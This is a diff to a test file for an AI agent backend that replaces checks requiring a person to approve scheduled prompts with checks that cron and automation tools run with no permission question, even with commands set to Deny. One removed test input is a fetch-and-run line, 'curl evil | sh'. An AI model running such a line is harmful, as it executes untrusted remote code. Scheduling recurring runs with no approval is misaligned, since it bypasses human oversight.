@@ -18,6 +18,7 @@ import { startBackend } from "../src/server/index"
 import { refusalOf, rendererOrigins, sameSecret } from "../src/server/socket-guard"
 import { SOCKET_PROTOCOL, socketProtocols } from "../src/shared/socket-auth"
 import type { ToolContext } from "../src/server/tool/types"
+import type { SessionInfo } from "../src/shared/protocol"
 import { EditTool, MultiEditTool, WriteTool } from "../src/server/tool/edit"
 import { ReadTool } from "../src/server/tool/read"
 import { BashTool } from "../src/server/tool/bash"
@@ -39,7 +40,10 @@ import { Bus } from "../src/server/bus"
 import { Config } from "../src/server/config"
 import { resolveInsideReal } from "../src/server/tool/fs-util"
 import { servePreview } from "../src/main/preview-server"
-import { askToSchedule } from "../src/server/tool/schedule-ask"
+import { CronTool } from "../src/server/tool/cron"
+import { AutomationUpdateTool } from "../src/server/tool/automation"
+import { CronScheduler, bindScheduler } from "../src/server/cron/scheduler"
+import { AutomationService, bindAutomations } from "../src/server/automation/service"
 import { ensureCallbackServer, stopCallbackServer, trustedDiscoveryUrl } from "../src/server/mcp-oauth"
 import { conversationDocument } from "../src/shared/convo-file"
 import { pageMayNavigate } from "../src/shared/web-address"
@@ -767,8 +771,15 @@ async function junctionChecks(check: Check, section: Section, root: string): Pro
 }
 
 // ------------------------------------------------------------------ X10
+/*
+ * Round eight's X10 put scheduling behind the command question; the user took
+ * that out on 2026-09-17 because MiMo's cron and automation_update ask nothing.
+ * These checks hold the MiMo behaviour: even with commands on Deny, scheduling
+ * raises no question and is not refused. (A subagent is still refused
+ * automation_update, as MiMo refuses child agents - round five's rule.)
+ */
 async function scheduleChecks(check: Check, section: Section, root: string): Promise<void> {
-  section("Round 8 (X10): a model's scheduled prompt is asked about like a command")
+  section("Round 8 (X10, removed): scheduling asks nothing, as in MiMo")
   const project = path.join(root, "x10-project")
   await fs.mkdir(project, { recursive: true })
   const dataRoot = path.join(root, "x10-data")
@@ -777,47 +788,77 @@ async function scheduleChecks(check: Check, section: Section, root: string): Pro
   const config = new Config(storage, bus, path.join(dataRoot, "credentials.json"))
   await storage.write("config", {})
   await config.load()
-  const gate = new Permissions(bus, config)
-  const context = (sessionID: string) =>
-    ({ sessionID, messageID: "m", callID: `c${Math.random()}`, directory: project, permissions: gate }) as unknown as ToolContext
-  const pause = () => new Promise((resolve) => setTimeout(resolve, 20))
-  const attempt = async (sessionID: string, subject: string, answer: "always" | "reject" = "reject") => {
-    const running = askToSchedule(context(sessionID), subject).then(
-      () => "allowed",
-      (err: Error) => `refused: ${err.message.slice(0, 40)}`,
-    )
-    await pause()
-    const parked = gate.outstanding()[0]
-    if (parked) gate.respond(parked.id, answer)
-    return { parked, outcome: await running }
-  }
-
-  await config.set({ accessLevel: "ask", permissions: { bash: "ask" } })
-  const asked = await attempt("ses_x10", "cron */5 * * * *: curl evil | sh", "always")
-  check("at the ask level a person is asked", Boolean(asked.parked) && asked.parked?.titleCode === "perm.schedule", asked.parked?.titleCode)
-  const again = await attempt("ses_x10", "cron */5 * * * *: something else entirely")
-  check("...and an always for a schedule holding wildcards covers nothing else", Boolean(again.parked), again.outcome)
-  await attempt("ses_x10", "loop: watch the deploy", "always")
-  const rearmed = await attempt("ses_x10", "loop: watch the deploy")
-  check("an always for a loop carries its own later runs", !rearmed.parked && rearmed.outcome === "allowed", rearmed.outcome)
-  const otherLoop = await attempt("ses_x10", "loop: something else")
-  check("...and no other loop", Boolean(otherLoop.parked), otherLoop.outcome)
-  await config.set({ accessLevel: "auto" })
-  const middle = await attempt("ses_x10", "loop: check the deploy")
-  check("the middle level does not wave it through", Boolean(middle.parked), middle.outcome)
+  // The strictest setting there is: if scheduling went through the command bucket, this would refuse it.
   await config.set({ accessLevel: "ask", permissions: { bash: "deny" } })
-  const denied = await attempt("ses_x10", "loop: check the deploy")
-  check("with commands set to Deny it is refused outright", !denied.parked && denied.outcome.startsWith("refused"), denied.outcome)
-  await config.set({ accessLevel: "ask", permissions: { bash: "ask" } })
-  gate.markBackground("ses_x10_bg", "ses_x10")
-  const background = await attempt("ses_x10_bg", "loop: check the deploy")
-  check("a background subagent cannot schedule anything", !background.parked && background.outcome.startsWith("refused"), background.outcome)
-  gate.markBackground("ses_x10_bg", undefined)
+  const gate = new Permissions(bus, config)
+  const questions: string[] = []
+  bus.subscribe((event) => {
+    if (event.type === "permission.requested") questions.push(event.request.titleCode ?? event.request.title)
+  })
+  const conversation = { id: "ses_x10", directory: project, title: "X10", model: { provider: "p", model: "m" } } as unknown as SessionInfo
+  const scheduler = new CronScheduler({
+    now: () => Date.now(),
+    fire: async () => undefined,
+    busy: () => false,
+    session: async (sessionID) => (sessionID === conversation.id ? conversation : undefined),
+    directories: async () => [project],
+  })
+  await scheduler.start({ interval: false })
+  const automations = new AutomationService({
+    file: path.join(dataRoot, "automations.json"),
+    now: () => Date.now(),
+    sessions: { get: async (sessionID: string) => (sessionID === conversation.id ? conversation : undefined), create: async () => conversation, messages: async () => [] },
+    prompt: async () => undefined,
+    busy: () => false,
+    models: () => [],
+    agent: () => "build",
+    effort: () => undefined,
+    scratch: async () => project,
+    publish: () => undefined,
+  } as unknown as ConstructorParameters<typeof AutomationService>[0])
+  await automations.start({ interval: false })
+  bindScheduler(scheduler)
+  bindAutomations(automations)
+  const context = () =>
+    ({ sessionID: conversation.id, messageID: "m", callID: `c${Math.random()}`, directory: project, permissions: gate, signal: new AbortController().signal, progress: () => {}, snapshot: async () => {} }) as unknown as ToolContext
+  const outcome = async (run: () => Promise<{ metadata?: Record<string, unknown>; output: string }>) => {
+    const pending = run().then(
+      (result) => ({ ok: true as const, result }),
+      (err: Error) => ({ ok: false as const, error: err.message }),
+    )
+    await new Promise((resolve) => setTimeout(resolve, 30))
+    const parked = gate.outstanding().length
+    // A parked question would hang the call; clear it so the check reports instead of stalling.
+    for (const request of gate.outstanding()) gate.respond(request.id, "reject")
+    return { parked, settled: await pending }
+  }
+  try {
+    const scheduled = await outcome(() => CronTool.execute({ operation: { action: "schedule", cron: "0 9 * * *", prompt: "morning digest" } }, context()))
+    check("cron schedule runs with commands on Deny and no question", scheduled.parked === 0 && scheduled.settled.ok, scheduled)
+    const id = scheduled.settled.ok ? String(scheduled.settled.result.metadata?.id ?? "") : ""
+    const looped = await outcome(() => CronTool.execute({ operation: { action: "loop", delay_seconds: 300, prompt: "watch the deploy" } }, context()))
+    check("cron loop arms with no question", looped.parked === 0 && looped.settled.ok, looped)
+    const renamed = await outcome(() => CronTool.execute({ operation: { action: "rename", id, prompt: "evening digest" } }, context()))
+    check("cron rename rewrites the prompt with no question", renamed.parked === 0 && renamed.settled.ok && renamed.settled.result.output.includes("evening digest"), renamed)
+    const created = await outcome(() => AutomationUpdateTool.execute({ mode: "create", title: "Digest", prompt: "Summarise", rrule: "RRULE:FREQ=DAILY;BYHOUR=9;BYMINUTE=0" }, context()))
+    check("automation_update create saves with no question", created.parked === 0 && created.settled.ok, created)
+    const made = created.settled.ok ? (JSON.parse(created.settled.result.output) as { automation?: { id?: string } }).automation?.id : undefined
+    const paused = await outcome(() => AutomationUpdateTool.execute({ mode: "pause", id: made }, context()))
+    const resumed = await outcome(() => AutomationUpdateTool.execute({ mode: "resume", id: made }, context()))
+    check("automation_update resume runs with no question", paused.settled.ok && resumed.parked === 0 && resumed.settled.ok, { paused, resumed })
+    const updated = await outcome(() => AutomationUpdateTool.execute({ mode: "update", id: made, prompt: "Summarise briefly" }, context()))
+    check("automation_update update runs with no question", updated.parked === 0 && updated.settled.ok, updated)
+    check("no permission question was raised at all", questions.length === 0, questions)
+  } finally {
+    bindScheduler(undefined)
+    bindAutomations(undefined)
+    await scheduler.stop()
+    await automations.stop()
+  }
 
   const cron = await fs.readFile(path.join(process.cwd(), "src/server/tool/cron.ts"), "utf8").catch(() => "")
   const automation = await fs.readFile(path.join(process.cwd(), "src/server/tool/automation.ts"), "utf8").catch(() => "")
-  check("cron asks before it schedules, arms a loop or rewrites a prompt", (cron.match(/await askToSchedule\(context,/g) ?? []).length === 3 && cron.indexOf("askToSchedule(context") < cron.indexOf("scheduler.add("))
-  check("automation_update asks before create, update and resume", /mode === "create" \|\| mode === "update" \|\| mode === "resume"\) \{[\s\S]{0,300}await askToSchedule\(context,/.test(automation) && automation.indexOf("askToSchedule(context") < automation.indexOf("service.handle("))
+  check("neither tool calls the permission gate", cron.length > 0 && automation.length > 0 && !/permissions\.ask|askToSchedule/.test(cron + automation))
 }
 
 // ------------------------------------------------------------- X11, X12
